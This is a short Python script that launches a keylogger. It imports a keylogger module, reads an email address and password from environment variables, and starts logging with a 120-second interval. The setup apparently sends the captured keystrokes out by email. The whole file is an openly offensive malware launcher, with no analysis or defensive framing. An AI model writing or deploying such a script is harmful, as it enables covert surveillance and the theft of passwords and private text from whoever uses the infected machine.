import keylogger
from dotenv import load_dotenv
import os

load_dotenv()

my_keylogger = keylogger.Keylogger(120, os.getenv("Email"), os.getenv("Password"))
my_keylogger.start()